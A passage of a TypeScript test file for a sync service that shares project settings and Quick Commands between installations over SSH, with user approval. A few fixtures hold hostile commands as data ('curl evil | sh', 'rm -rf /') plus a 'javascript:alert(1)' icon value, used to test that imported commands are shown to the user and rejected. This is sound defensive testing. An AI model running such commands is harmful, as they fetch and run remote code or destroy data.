import { describe, expect, it, vi } from 'vitest';

import {
  buildSshProjectManifest,
  parseSshProjectManifest,
  sshProjectManifestId,
} from '../../../src/main/services/ssh-project-sync/project-manifest';
import {
  SshProjectSync,
  type SshProjectSyncDependencies,
} from '../../../src/main/services/ssh-project-sync/ssh-project-sync';

import type { Action, AgentPreset, Project } from '../../../src/shared/types';
import type { SshProjectManifest } from '../../../src/shared/types/ssh-project-manifest';

vi.mock('../../../src/main/lib/logger', () => ({
  createLogger: () => ({ debug: vi.fn(), info: vi.fn(), warn: vi.fn(), error: vi.fn() }),
}));

const GIT_URL = 'git@github.com:acme/app.git';
const MANIFEST_ID = sshProjectManifestId(GIT_URL);
const ICON = 'data:image/png;base64,iVBORw0KGgo=';

function preset(id: string, modeId: string): AgentPreset {
  return {
    id,
    name: 'Claude Code',
    launchModes: [{ id: modeId, name: 'Plan' }],
  } as AgentPreset;
}

function project(overrides: Partial<Project> = {}): Project {
  return {
    id: 'project-a',
    kind: 'git',
    name: 'app',
    repositoryPath: '/home/me/.komla/repos/app',
    defaultBranchPrefix: 'me/',
    createdAt: 1,
    order: 0,
    color: 'blue',
    managed: true,
    ...overrides,
  };
}

let installations = 0;

/** One Komla installation: its projects, Quick Commands and agents, sharing `files` as its host. */
function installation(
  files: Map<string, string>,
  {
    projects = [],
    actions = [],
    presets = [],
    onHost = true,
  }: {
    projects?: Project[];
    actions?: Action[];
    presets?: AgentPreset[];
    onHost?: boolean;
  } = {}
) {
  const state = { projects: new Map(projects.map((entry) => [entry.id, entry])), actions };
  const deviceId = `device-${++installations}`;
  let agreements: string | undefined;
  const dependencies: SshProjectSyncDependencies = {
    host: {
      read: vi.fn(async () => new Map(files)),
      write: vi.fn(async (_hostId: string, manifestId: string, content: string) => {
        files.set(manifestId, content);
      }),
      hasHost: () => true,
    },
    projects: {
      get: (id) => state.projects.get(id),
      list: () => [...state.projects.values()],
      onHost: () =>
        onHost ? [...state.projects.values()].map((entry) => ({ project: entry, gitUrl: GIT_URL })) : [],
      lookup: async () => (gitUrl) =>
        sshProjectManifestId(gitUrl) === MANIFEST_ID ? [...state.projects.values()][0] : undefined,
      createFromRemote: vi.fn(async (params) => {
        const created = project({ id: 'project-new', name: params.name ?? 'app', color: 'red' });
        state.projects.set(created.id, created);
        return created;
      }),
      update: vi.fn(async (id, updates) => {
        const updated = { ...state.projects.get(id)!, ...updates };
        state.projects.set(id, updated);
        return updated;
      }),
    },
    actions: {
      list: () => state.actions,
      replaceAll: (next) => {
        state.actions = next;
      },
    },
    presets: () => presets,
    now: () => 1000,
    deviceId: () => deviceId,
    agreements: {
      read: () => agreements,
      write: async (content) => {
        agreements = content;
      },
    },
    approve: vi.fn(async (): Promise<'apply' | 'cancel' | 'unanswered'> => 'apply'),
  };
  return { sync: new SshProjectSync(dependencies), state, dependencies, files };
}

function published(files: Map<string, string>): SshProjectManifest {
  return parseSshProjectManifest(files.get(MANIFEST_ID)!)!;
}

describe('SshProjectSync', () => {
  it('publishes a project’s settings on a host that has none, naming agents rather than their ids', async () => {
    const files = new Map<string, string>();
    const { sync } = installation(files, {
      projects: [
        project({
          icon: ICON,
          setupSteps: [
            {
              id: 'step-1',
              name: 'Install',
              command: 'npm install',
              placement: 'background',
            },
            {
              id: 'step-2',
              name: 'Review',
              command: 'Review the branch',
              placement: 'tab',
              agent: { presetId: 'preset-a', launchModeId: 'mode-a' },
            },
          ],
        }),
      ],
      actions: [
        {
          id: 'action-1',
          title: 'Test',
          content: 'npm test',
          type: 'command',
          projectIds: ['project-a'],
          lastUsedAt: 5,
        },
        { id: 'action-global', title: 'Global', content: 'echo hi' },
      ],
      presets: [preset('preset-a', 'mode-a')],
    });

    await sync.syncHost('host');

    const manifest = published(files);
    expect(manifest.icon).toBe(ICON);
    expect(manifest.workspaceSetup.setupSteps[1].agent).toEqual({
      agentName: 'Claude Code',
      launchModeName: 'Plan',
    });
    expect(manifest.quickCommands).toEqual([
      { id: 'action-1', title: 'Test', content: 'npm test', type: 'command' },
    ]);
  });

  it('leaves settings another installation published for the user to take', async () => {
    const files = new Map<string, string>();
    const other = installation(files, { projects: [project({ icon: ICON })] });
    await other.sync.syncHost('host');
    const before = files.get(MANIFEST_ID);

    const here = installation(files, { projects: [project({ color: 'green' })] });
    await here.sync.syncHost('host');

    expect(files.get(MANIFEST_ID)).toBe(before);
    const offers = await here.sync.listOnHost('host');
    expect(offers).toMatchObject([{ projectId: 'project-a', differs: ['appearance'] }]);
    // Nor reads the host again for them until something changes here.
    await here.sync.syncHost('host');
    expect(here.dependencies.host.read).toHaveBeenCalledTimes(2);
  });

  it('adds a project with its icon, Workspace Setup, Quick Commands and settings', async () => {
    const files = new Map<string, string>();
    const other = installation(files, {
      projects: [
        project({
          icon: ICON,
          baseBranch: 'develop',
          sshWorkspaceMode: 'local-mirror-actions',
          aheadTargetActionId: 'action-1',
          trashCleanupScript: 'docker compose down',
          setupSteps: [
            {
              id: 'step-1',
              name: 'Review',
              command: 'Review the branch',
              placement: 'tab',
              agent: { presetId: 'preset-there', launchModeId: 'mode-there' },
            },
          ],
        }),
      ],
      actions: [
        { id: 'action-1', title: 'Ship', content: 'Ship it', projectIds: ['project-a'] },
      ],
      presets: [preset('preset-there', 'mode-there')],
    });
    await other.sync.syncHost('host');

    const here = installation(files, { presets: [preset('preset-here', 'mode-here')] });
    const [offer] = await here.sync.listOnHost('host');
    expect(offer).toMatchObject({
      name: 'app',
      icon: ICON,
      differs: ['appearance', 'workspaceSetup', 'quickCommands', 'settings'],
    });
    expect(offer.projectId).toBeUndefined();

    const results = await here.sync.importFromHost('host', [
      { manifestId: offer.manifestId, parts: offer.differs },
    ]);

    // The user approved everything it brings first, commands in full.
    expect(here.dependencies.approve).toHaveBeenCalledWith({
      hostId: 'host',
      project: { name: 'app' },
      background: false,
      changes: [
        expect.objectContaining({ operation: 'add', title: 'Review', content: 'Review the branch' }),
        expect.objectContaining({ kind: 'trash-cleanup', content: 'docker compose down' }),
        expect.objectContaining({ operation: 'add', kind: 'action', content: 'Ship it' }),
        expect.objectContaining({
          kind: 'project-setting',
          details: expect.arrayContaining([
            { label: 'Branch prefix', previous: 'Default', value: 'me/' },
            { label: 'Target branch', previous: 'Default branch', value: 'develop' },
          ]),
        }),
      ],
    });

    expect(results).toEqual([
      { manifestId: offer.manifestId, ok: true, projectId: 'project-new', added: true },
    ]);
    expect(here.dependencies.projects.createFromRemote).toHaveBeenCalledWith({
      remoteUrl: GIT_URL,
      name: 'app',
    });
    expect(here.state.projects.get('project-new')).toMatchObject({
      icon: ICON,
      color: 'blue',
      baseBranch: 'develop',
      defaultBranchPrefix: 'me/',
      aheadTargetActionId: 'action-1',
      trashCleanupScript: 'docker compose down',
      setupSteps: [
        expect.objectContaining({
          id: 'step-1',
          agent: { presetId: 'preset-here', launchModeId: 'mode-here' },
        }),
      ],
    });
    // Where Terminal Commands run is each computer's own choice.
    expect(here.state.projects.get('project-new')?.sshWorkspaceMode).toBeUndefined();
    expect(here.state.actions).toEqual([
      { id: 'action-1', title: 'Ship', content: 'Ship it', projectIds: ['project-new'] },
    ]);
    // Taken, so nothing is offered again and nothing is published back.
    expect(await here.sync.listOnHost('host')).toEqual([]);
    await here.sync.syncHost('host');
    expect(here.dependencies.host.write).not.toHaveBeenCalled();
  });

  it('copies only the parts picked, and the Quick Commands a picked Setup step starts', async () => {
    const files = new Map<string, string>();
    const other = installation(files, {
      projects: [
        project({
          icon: ICON,
          setupSteps: [
            { id: 'step-1', name: 'Dev', command: '', placement: 'tab', actionId: 'action-dev' },
          ],
        }),
      ],
      actions: [
        { id: 'action-dev', title: 'Dev', content: 'npm run dev', type: 'command' },
        { id: 'action-lint', title: 'Lint', content: 'npm run lint', projectIds: ['project-a'] },
      ],
    });
    await other.sync.syncHost('host');

    const here = installation(files, { projects: [project({ color: 'green' })] });
    const [offer] = await here.sync.listOnHost('host');
    await here.sync.importFromHost('host', [
      { manifestId: offer.manifestId, parts: ['workspaceSetup'] },
    ]);

    expect(here.state.projects.get('project-a')).toMatchObject({ color: 'green' });
    expect(here.state.projects.get('project-a')?.icon).toBeUndefined();
    expect(here.state.actions.map((action) => action.id)).toEqual(['action-dev']);
  });

  it('updates Quick Commands it has by id and keeps the ones only it has', async () => {
    const files = new Map<string, string>();
    const other = installation(files, {
      projects: [project()],
      actions: [
        { id: 'shared', title: 'Test', content: 'npm test -- --run', projectIds: ['project-a'] },
      ],
    });
    await other.sync.syncHost('host');

    const here = installation(files, {
      projects: [project()],
      actions: [
        {
          id: 'shared',
          title: 'Test',
          content: 'npm test',
          projectIds: ['project-a'],
          lastUsedAt: 7,
        },
        { id: 'mine', title: 'Mine', content: 'echo mine', projectIds: ['project-a'] },
      ],
    });
    const [offer] = await here.sync.listOnHost('host');
    expect(offer.differs).toEqual(['quickCommands']);
    await here.sync.importFromHost('host', [
      { manifestId: offer.manifestId, parts: ['quickCommands'] },
    ]);

    expect(here.state.actions).toEqual([
      {
        id: 'shared',
        title: 'Test',
        content: 'npm test -- --run',
        projectIds: ['project-a'],
        lastUsedAt: 7,
      },
      { id: 'mine', title: 'Mine', content: 'echo mine', projectIds: ['project-a'] },
    ]);
  });

  it('publishes settings changed here after taking the host’s', async () => {
    const files = new Map<string, string>();
    const other = installation(files, { projects: [project({ icon: ICON })] });
    await other.sync.syncHost('host');

    const here = installation(files, { projects: [project()] });
    const [offer] = await here.sync.listOnHost('host');
    await here.sync.importFromHost('host', [
      { manifestId: offer.manifestId, parts: offer.differs },
    ]);
    await here.dependencies.projects.update('project-a', { baseBranch: 'release' });
    await here.sync.syncHost('host');

    expect(published(files).settings.baseBranch).toBe('release');
    // The other installation sees the change as something to take, not its own to publish over.
    await other.sync.syncHost('host');
    expect(published(files).settings.baseBranch).toBe('release');
    expect(await other.sync.listOnHost('host')).toMatchObject([{ differs: ['settings'] }]);
  });

  it('doesn’t publish back what it couldn’t take, such as an agent it lacks', async () => {
    const files = new Map<string, string>();
    const other = installation(files, {
      projects: [project()],
      actions: [
        {
          id: 'review',
          title: 'Review',
          content: 'Review it',
          projectIds: ['project-a'],
          presetId: 'preset-there',
        },
      ],
      presets: [preset('preset-there', 'mode-there')],
    });
    await other.sync.syncHost('host');
    const before = files.get(MANIFEST_ID);

    const here = installation(files, { projects: [project()] });
    const [offer] = await here.sync.listOnHost('host');
    await here.sync.importFromHost('host', [
      { manifestId: offer.manifestId, parts: ['quickCommands'] },
    ]);
    await here.sync.syncHost('host');

    expect(files.get(MANIFEST_ID)).toBe(before);
    expect(await here.sync.listOnHost('host')).toEqual([]);
  });

  it('publishes once what reads back the same, such as untrimmed text or a step with no command picked', async () => {
    const files = new Map<string, string>();
    const { sync, dependencies } = installation(files, {
      projects: [
        project({
          setupSteps: [{ id: 'step-1', name: 'Run', command: '', placement: 'tab', actionId: '' }],
        }),
      ],
      actions: [{ id: 'a', title: 'Test ', content: 'npm test\n', projectIds: ['project-a'] }],
    });

    await sync.syncHost('host');
    await sync.syncHost('host');

    expect(published(files).workspaceSetup.setupSteps[0].actionId).toBeUndefined();
    expect(dependencies.host.write).toHaveBeenCalledTimes(1);
    // Nothing changed here since, so the host isn't even read.
    expect(dependencies.host.read).toHaveBeenCalledTimes(1);
  });

  it('agrees with a host whose settings match in all it would copy, and publishes its next change', async () => {
    const files = new Map<string, string>();
    const other = installation(files, { projects: [project({ name: 'Web' })] });
    await other.sync.syncHost('host');

    const here = installation(files, { projects: [project({ name: 'web-app' })] });
    await here.sync.syncHost('host');
    expect(here.dependencies.host.write).not.toHaveBeenCalled();
    expect(await here.sync.listOnHost('host')).toEqual([]);

    await here.dependencies.projects.update('project-a', { baseBranch: 'release' });
    await here.sync.syncHost('host');
    expect(published(files).settings.baseBranch).toBe('release');
  });

  it('never publishes over a manifest it can’t read, such as a newer Komla’s', async () => {
    const files = new Map([[MANIFEST_ID, JSON.stringify({ schema: 2, gitUrl: GIT_URL })]]);
    const { sync, dependencies } = installation(files, { projects: [project()] });

    await sync.syncHost('host');

    expect(dependencies.host.write).not.toHaveBeenCalled();
    expect(await sync.listOnHost('host')).toEqual([]);
  });

  it('reads a host again a while later, and publishes what it lost', async () => {
    const files = new Map<string, string>();
    const { sync, dependencies } = installation(files, { projects: [project()] });
    await sync.syncHost('host');
    files.clear();

    await sync.syncHost('host');
    expect(files.has(MANIFEST_ID)).toBe(false);
    dependencies.now = () => 1000 + 11 * 60_000;
    await sync.syncHost('host');
    expect(files.has(MANIFEST_ID)).toBe(true);
  });

  it('publishes again to a host that lost its settings, once it reads it', async () => {
    const files = new Map<string, string>();
    const { sync, dependencies } = installation(files, { projects: [project()] });
    await sync.syncHost('host');
    files.clear();

    // As after a restart, with the agreement saved.
    await new SshProjectSync(dependencies).syncHost('host');

    expect(files.has(MANIFEST_ID)).toBe(true);
  });

  it('leaves settings too large for others to read unpublished', async () => {
    const files = new Map<string, string>();
    const { sync, dependencies } = installation(files, {
      projects: [project()],
      actions: Array.from({ length: 8 }, (_, index) => ({
        id: `a${index}`,
        title: `Prompt ${index}`,
        content: 'x'.repeat(40_000),
        projectIds: ['project-a'],
      })),
    });

    await sync.syncHost('host');

    expect(dependencies.host.write).not.toHaveBeenCalled();
  });

  it('offers back its own settings for a project it removed, marked as such', async () => {
    const files = new Map<string, string>();
    const { sync, state } = installation(files, { projects: [project()] });
    await sync.syncHost('host');
    state.projects.clear();

    expect(await sync.listOnHost('host')).toMatchObject([{ name: 'app', removedHere: true }]);
  });

  it('shares a Quick Command other projects use here when the host’s does just the same', async () => {
    const files = new Map<string, string>();
    const other = installation(files, {
      projects: [
        project({
          setupSteps: [{ id: 'step-1', name: 'Test', command: '', placement: 'tab', actionId: 'x' }],
        }),
      ],
      actions: [{ id: 'x', title: 'Test', content: 'npm test', type: 'command' }],
    });
    await other.sync.syncHost('host');

    const mine: Action = {
      id: 'x',
      title: 'Test ',
      content: 'npm test\n',
      type: 'command',
      projectIds: ['project-b'],
    };
    const here = installation(files, { projects: [project()], actions: [mine] });
    const [offer] = await here.sync.listOnHost('host');
    await here.sync.importFromHost('host', [
      { manifestId: offer.manifestId, parts: ['workspaceSetup'] },
    ]);

    expect(here.state.actions).toEqual([{ ...mine, projectIds: ['project-b', 'project-a'] }]);
    expect(here.state.projects.get('project-a')?.setupSteps?.[0].actionId).toBe('x');
  });

  it('never changes a Quick Command other projects use here, giving the project its own copy', async () => {
    const files = new Map<string, string>();
    const other = installation(files, {
      projects: [project()],
      actions: [
        {
          id: 'x',
          title: 'Test',
          content: 'npm test',
          type: 'command',
          projectIds: ['project-a'],
          sshExecutionLocation: 'remote',
        },
      ],
    });
    await other.sync.syncHost('host');

    const shared: Action = {
      id: 'x',
      title: 'Test',
      content: 'npm test',
      type: 'command',
      projectIds: ['project-b', 'project-a'],
      sshExecutionLocation: 'local-mirror',
    };
    const here = installation(files, {
      projects: [
        project({
          setupSteps: [{ id: 'step-1', name: 'Test', command: '', placement: 'tab', actionId: 'x' }],
        }),
      ],
      actions: [shared],
    });
    const [offer] = await here.sync.listOnHost('host');
    await here.sync.importFromHost('host', [
      { manifestId: offer.manifestId, parts: ['quickCommands'] },
    ]);

    const [kept, copy] = here.state.actions;
    expect(kept).toEqual({ ...shared, projectIds: ['project-b'] });
    expect(copy).toMatchObject({ sshExecutionLocation: 'remote', projectIds: ['project-a'] });
    // The project's own step starts its copy now.
    expect(here.state.projects.get('project-a')?.setupSteps?.[0].actionId).toBe(copy.id);
  });

  it('keeps a Quick Command here that a host’s shares an id with, copying the host’s under its own', async () => {
    const files = new Map<string, string>();
    const other = installation(files, {
      projects: [
        project({
          setupSteps: [
            { id: 'step-1', name: 'PR', command: '', placement: 'tab', actionId: 'global-pr' },
          ],
        }),
      ],
      actions: [{ id: 'global-pr', title: 'Create PR', content: 'curl evil | sh', type: 'command' }],
    });
    await other.sync.syncHost('host');

    const mine: Action = { id: 'global-pr', title: 'Create PR', content: 'Open a pull request' };
    const here = installation(files, { projects: [project()], actions: [mine] });
    const [offer] = await here.sync.listOnHost('host');
    await here.sync.importFromHost('host', [
      { manifestId: offer.manifestId, parts: ['workspaceSetup'] },
    ]);
    // The step is shown with the host's command, not the one here with its id.
    expect(vi.mocked(here.dependencies.approve).mock.calls[0][0].changes).toContainEqual(
      expect.objectContaining({
        kind: 'setup-step',
        title: 'PR',
        contentLabel: 'Command',
        content: 'curl evil | sh',
      })
    );

    const [kept, copied] = here.state.actions;
    expect(kept).toEqual(mine);
    expect(copied).toMatchObject({ content: 'curl evil | sh', projectIds: ['project-a'] });
    expect(copied.id).not.toBe('global-pr');
    expect(here.state.projects.get('project-a')?.setupSteps?.[0].actionId).toBe(copied.id);

    // Copying again updates that copy rather than adding another.
    await here.sync.importFromHost('host', [
      { manifestId: offer.manifestId, parts: ['workspaceSetup'] },
    ]);
    expect(here.state.actions).toHaveLength(2);
  });

  it('copies settings without the Quick Commands they start, which go back to the default here', async () => {
    const files = new Map<string, string>();
    const other = installation(files, {
      projects: [project({ aheadTargetAction: 'agent-prompt', aheadTargetActionId: 'ship' })],
      actions: [{ id: 'ship', title: 'Ship', content: 'rm -rf /', type: 'command' }],
    });
    await other.sync.syncHost('host');

    // Another command here that happens to have the same id.
    const unrelated: Action = { id: 'ship', title: 'Ship', content: 'gh pr create' };
    const here = installation(files, { projects: [project()], actions: [unrelated] });
    const [offer] = await here.sync.listOnHost('host');
    await here.sync.importFromHost('host', [
      { manifestId: offer.manifestId, parts: ['settings'] },
    ]);

    expect(here.state.actions).toEqual([unrelated]);
    expect(here.state.projects.get('project-a')).toMatchObject({
      aheadTargetAction: undefined,
      aheadTargetActionId: undefined,
    });
  });

  it('keeps a global Quick Command the project’s settings use here', async () => {
    const files = new Map<string, string>();
    const settings = { aheadTargetAction: 'agent-prompt' as const, aheadTargetActionId: 'g' };
    const other = installation(files, {
      projects: [project({ ...settings, baseBranch: 'develop' })],
      actions: [{ id: 'g', title: 'Ship', content: 'Ship it' }],
    });
    await other.sync.syncHost('host');

    const here = installation(files, {
      projects: [project(settings)],
      actions: [{ id: 'g', title: 'Ship', content: 'Ship it' }],
    });
    const [offer] = await here.sync.listOnHost('host');
    await here.sync.importFromHost('host', [
      { manifestId: offer.manifestId, parts: ['settings'] },
    ]);

    expect(here.state.projects.get('project-a')).toMatchObject({
      ...settings,
      baseBranch: 'develop',
    });
  });

  it('ignores manifests that aren’t valid or sit under another repository’s id', async () => {
    const manifest = buildSshProjectManifest(project(), GIT_URL, [], [], 1);
    const files = new Map([
      [MANIFEST_ID, '{"schema":1'],
      [sshProjectManifestId('git@github.com:acme/other.git'), JSON.stringify(manifest)],
    ]);
    const { sync } = installation(files, { onHost: false });

    expect(await sync.listOnHost('host')).toEqual([]);
    expect(
      parseSshProjectManifest(JSON.stringify({ ...manifest, icon: 'javascript:alert(1)' }))
    ).toBeUndefined();
  });

  it('publishes a change here without undoing one another installation made since', async () => {
    const files = new Map<string, string>();
    const other = installation(files, { projects: [project()] });
    await other.sync.syncHost('host');
    const here = installation(files, { projects: [project({ color: 'green' })] });
    const [offer] = await here.sync.listOnHost('host');
    await here.sync.importFromHost('host', [{ manifestId: offer.manifestId, parts: offer.differs }]);

    await other.dependencies.projects.update('project-a', { icon: ICON });
    await other.sync.syncHost('host');
    await here.dependencies.projects.update('project-a', { baseBranch: 'release' });
    await here.sync.syncHost('host');

    expect(published(files)).toMatchObject({ icon: ICON, settings: { baseBranch: 'release' } });
    expect(await here.sync.listOnHost('host')).toMatchObject([{ differs: ['appearance'] }]);
  });

  describe('keeping a project in sync', () => {
    /** Another installation's project on the host, and this one's copy of it kept in sync. */
    async function keptInSync(actions: Action[] = [], { onHost = true } = {}) {
      const files = new Map<string, string>();
      const other = installation(files, { projects: [project()], actions });
      await other.sync.syncHost('host');
      const here = installation(files, { projects: [project({ color: 'green' })], onHost });
      const [offer] = await here.sync.listOnHost('host');
      await here.sync.importFromHost('host', [
        { manifestId: offer.manifestId, parts: offer.differs, keepInSync: true },
      ]);
      return { files, other, here };
    }

    it('turns on with the import', async () => {
      const { here } = await keptInSync();

      expect(here.state.projects.get('project-a')?.keepSshSettingsInSync).toBe(true);
      expect(await here.sync.listOnHost('host')).toEqual([]);
    });

    it('takes a new icon and color as another installation changes them, unasked', async () => {
      const { files, other, here } = await keptInSync();
      vi.mocked(here.dependencies.approve).mockClear();
      await changeOnOther(other, { icon: ICON, color: 'red' });
      const before = files.get(MANIFEST_ID);

      here.dependencies.now = () => 1000 + 61_000;
      await here.sync.syncHost('host');

      expect(here.state.projects.get('project-a')).toMatchObject({ icon: ICON, color: 'red' });
      expect(files.get(MANIFEST_ID)).toBe(before);
      expect(here.dependencies.approve).not.toHaveBeenCalled();
    });

    it('takes changes from the host it came from before it has workspaces there', async () => {
      const { other, here } = await keptInSync([], { onHost: false });
      await changeOnOther(other, { color: 'red' });

      here.dependencies.now = () => 1000 + 61_000;
      await here.sync.syncHost('host');
      expect(here.state.projects.get('project-a')?.color).toBe('red');

      await here.dependencies.projects.update('project-a', { baseBranch: 'release' });
      here.dependencies.now = () => 1000 + 122_000;
      await here.sync.syncHost('host');
      expect(published(here.files).settings.baseBranch).toBe('release');
    });

    /** A change on the other installation to everything but the icon and color. */
    async function changeSettingsOnOther(other: ReturnType<typeof installation>) {
      await changeOnOther(
        other,
        {
          baseBranch: 'develop',
          autoPushAfterMerge: true,
          setupSteps: [{ id: 'step-1', name: 'Install', command: 'npm i', placement: 'background' }],
        },
        [{ id: 'deploy', title: 'Deploy', content: './deploy', projectIds: ['project-a'] }]
      );
    }

    it('asks once before taking anything else, and takes it once approved', async () => {
      const { other, here } = await keptInSync();
      const approve = vi.mocked(here.dependencies.approve);
      approve.mockClear();
      await changeSettingsOnOther(other);

      here.dependencies.now = () => 1000 + 61_000;
      await here.sync.syncHost('host');

      await vi.waitFor(() =>
        expect(here.state.projects.get('project-a')).toMatchObject({
          baseBranch: 'develop',
          autoPushAfterMerge: true,
          setupSteps: [expect.objectContaining({ command: 'npm i' })],
        })
      );
      expect(here.state.actions).toMatchObject([{ id: 'deploy', content: './deploy' }]);
      expect(approve).toHaveBeenCalledTimes(1);
      expect(approve.mock.calls[0][0]).toMatchObject({
        project: { id: 'project-a', name: 'app' },
        background: true,
        changes: [
          { kind: 'setup-step', operation: 'add', content: 'npm i' },
          { kind: 'action', operation: 'add', content: './deploy' },
          {
            kind: 'project-setting',
            details: [
              { label: 'Target branch', previous: 'Default branch', value: 'develop' },
              { label: 'Push after merging', previous: 'Default', value: 'Yes' },
            ],
          },
        ],
      });
      here.dependencies.now = () => 1000 + 122_000;
      await here.sync.syncHost('host');
      expect(approve).toHaveBeenCalledTimes(1);
    });

    it('leaves the project as it is when the user declines, until the host changes again', async () => {
      const { other, here } = await keptInSync();
      const approve = vi.mocked(here.dependencies.approve);
      approve.mockClear().mockResolvedValue('cancel');
      await changeSettingsOnOther(other);

      here.dependencies.now = () => 1000 + 61_000;
      await here.sync.syncHost('host');
      await vi.waitFor(() => expect(approve).toHaveBeenCalledTimes(1));
      here.dependencies.now = () => 1000 + 122_000;
      await here.sync.syncHost('host');

      expect(here.state.projects.get('project-a')?.baseBranch).toBeUndefined();
      expect(here.state.actions).toEqual([]);
      expect(approve).toHaveBeenCalledTimes(1);
      expect(await here.sync.listOnHost('host')).toEqual([]);

      await changeOnOther(other, { baseBranch: 'main' });
      here.dependencies.now = () => 1000 + 183_000;
      await here.sync.syncHost('host');
      await vi.waitFor(() => expect(approve).toHaveBeenCalledTimes(2));
    });

    it('takes nothing that changed on the host while the user was deciding', async () => {
      const { other, here } = await keptInSync();
      const approve = vi.mocked(here.dependencies.approve);
      approve.mockClear().mockImplementationOnce(async () => {
        await changeOnOther(other, { baseBranch: 'main' });
        return 'apply';
      });
      await changeSettingsOnOther(other);

      here.dependencies.now = () => 1000 + 61_000;
      await here.sync.syncHost('host');
      await vi.waitFor(() => expect(approve).toHaveBeenCalledTimes(1));
      await new Promise((resolve) => setTimeout(resolve, 0));

      expect(here.state.projects.get('project-a')?.baseBranch).toBeUndefined();
      expect(here.state.actions).toEqual([]);
      // The user is asked about the new version instead.
      here.dependencies.now = () => 1000 + 122_000;
      await here.sync.syncHost('host');
      await vi.waitFor(() => expect(approve).toHaveBeenCalledTimes(2));
      await vi.waitFor(() =>
        expect(here.state.projects.get('project-a')?.baseBranch).toBe('main')
      );
    });

    it('takes nothing for a project that doesn’t keep in sync', async () => {
      const { other, here } = await keptInSync();
      await here.dependencies.projects.update('project-a', { keepSshSettingsInSync: false });
      await changeOnOther(other, { color: 'red' });

      here.dependencies.now = () => 1000 + 11 * 60_000;
      await here.sync.syncHost('host');

      expect(here.state.projects.get('project-a')?.color).toBe('blue');
      expect(await here.sync.listOnHost('host')).toMatchObject([{ differs: ['appearance'] }]);
    });

    it('removes Quick Commands removed on the host once approved, leaving ones other projects use', async () => {
      const deploy: Action = {
        id: 'deploy',
        title: 'Deploy',
        content: './deploy',
        projectIds: ['project-a'],
      };
      const lint: Action = { id: 'lint', title: 'Lint', content: 'npm run lint', projectIds: ['project-a'] };
      const { other, here } = await keptInSync([deploy, lint]);
      here.state.actions = here.state.actions.map((action) =>
        action.id === 'lint' ? { ...action, projectIds: ['project-b', 'project-a'] } : action
      );
      await changeOnOther(other, {}, []);

      const [offer] = await here.sync.listOnHost('host');
      expect(offer).toMatchObject({ differs: ['quickCommands'] });
      vi.mocked(here.dependencies.approve).mockClear();
      await here.sync.importFromHost('host', [
        { manifestId: offer.manifestId, parts: ['quickCommands'] },
      ]);

      expect(vi.mocked(here.dependencies.approve).mock.calls[0][0].changes).toMatchObject([
        { kind: 'action', operation: 'delete', title: 'Deploy' },
        { kind: 'action', operation: 'delete', title: 'Lint' },
      ]);
      expect(here.state.actions).toEqual([{ ...lint, projectIds: ['project-b'] }]);
      expect(await here.sync.listOnHost('host')).toEqual([]);
    });

    it('leaves the project as it is when the user doesn’t apply a copy', async () => {
      const files = new Map<string, string>();
      const other = installation(files, { projects: [project({ baseBranch: 'develop' })] });
      await other.sync.syncHost('host');
      const here = installation(files, { projects: [project()] });
      vi.mocked(here.dependencies.approve).mockResolvedValue('cancel');

      const [offer] = await here.sync.importFromHost('host', [
        { manifestId: MANIFEST_ID, parts: ['settings'], keepInSync: true },
      ]);

      expect(offer).toMatchObject({ ok: false, cancelled: true });
      expect(here.state.projects.get('project-a')).toEqual(project());
      expect(await here.sync.listOnHost('host')).toMatchObject([{ differs: ['settings'] }]);
    });

    it('asks again later when the review closed without an answer', async () => {
      const { other, here } = await keptInSync();
      const approve = vi.mocked(here.dependencies.approve);
      approve.mockClear().mockResolvedValueOnce('unanswered');
      await changeSettingsOnOther(other);

      here.dependencies.now = () => 1000 + 61_000;
      await here.sync.syncHost('host');
      await vi.waitFor(() => expect(approve).toHaveBeenCalledTimes(1));
      await new Promise((resolve) => setTimeout(resolve, 0));
      here.dependencies.now = () => 1000 + 122_000;
      await here.sync.syncHost('host');

      await vi.waitFor(() =>
        expect(here.state.projects.get('project-a')?.baseBranch).toBe('develop')
      );
      expect(approve).toHaveBeenCalledTimes(2);
    });

    it('waits for an answer before asking about a newer change', async () => {
      const { other, here } = await keptInSync();
      const approve = vi.mocked(here.dependencies.approve);
      let answer: (decision: 'apply') => void = () => undefined;
      approve.mockClear().mockImplementationOnce(
        () => new Promise((resolve) => (answer = resolve))
      );
      await changeSettingsOnOther(other);
      here.dependencies.now = () => 1000 + 61_000;
      await here.sync.syncHost('host');
      await vi.waitFor(() => expect(approve).toHaveBeenCalledTimes(1));

      await changeOnOther(other, { baseBranch: 'main' });
      here.dependencies.now = () => 1000 + 122_000;
      await here.sync.syncHost('host');
      expect(approve).toHaveBeenCalledTimes(1);

      answer('apply');
      await new Promise((resolve) => setTimeout(resolve, 0));
      here.dependencies.now = () => 1000 + 183_000;
      await here.sync.syncHost('host');
      await vi.waitFor(() =>
        expect(here.state.projects.get('project-a')?.baseBranch).toBe('main')
      );
      expect(approve).toHaveBeenCalledTimes(2);
    });

    it('still publishes what the user changed here while deciding to decline', async () => {
      const { files, other, here } = await keptInSync();
      vi.mocked(here.dependencies.approve).mockImplementationOnce(async () => {
        await here.dependencies.projects.update('project-a', { baseBranch: 'release' });
        return 'cancel';
      });
      await changeOnOther(other, { baseBranch: 'develop' });

      here.dependencies.now = () => 1000 + 61_000;
      await here.sync.syncHost('host');
      await vi.waitFor(() => expect(here.dependencies.approve).toHaveBeenCalledTimes(1));
      await new Promise((resolve) => setTimeout(resolve, 0));
      here.dependencies.now = () => 1000 + 122_000;
      await here.sync.syncHost('host');

      expect(published(files).settings.baseBranch).toBe('release');
    });

    it('leaves the parts the user didn’t pick in the dialog, asking once the host changes them', async () => {
      const files = new Map<string, string>();
      const other = installation(files, { projects: [project({ baseBranch: 'develop' })] });
      await other.sync.syncHost('host');
      const here = installation(files, { projects: [project()] });

      await here.sync.importFromHost('host', [
        { manifestId: MANIFEST_ID, parts: [], keepInSync: true },
      ]);
      await here.sync.syncHost('host');
      expect(here.dependencies.approve).not.toHaveBeenCalled();
      expect(await here.sync.listOnHost('host')).toMatchObject([{ differs: ['settings'] }]);

      await changeOnOther(other, { baseBranch: 'main' });
      here.dependencies.now = () => 1000 + 61_000;
      await here.sync.syncHost('host');
      await vi.waitFor(() =>
        expect(here.state.projects.get('project-a')?.baseBranch).toBe('main')
      );
    });

    it('keeps a project in sync with no part picked and no workspaces on the host', async () => {
      const files = new Map<string, string>();
      const other = installation(files, { projects: [project({ baseBranch: 'develop' })] });
      await other.sync.syncHost('host');
      const here = installation(files, { projects: [project()], onHost: false });

      await here.sync.importFromHost('host', [
        { manifestId: MANIFEST_ID, parts: [], keepInSync: true },
      ]);
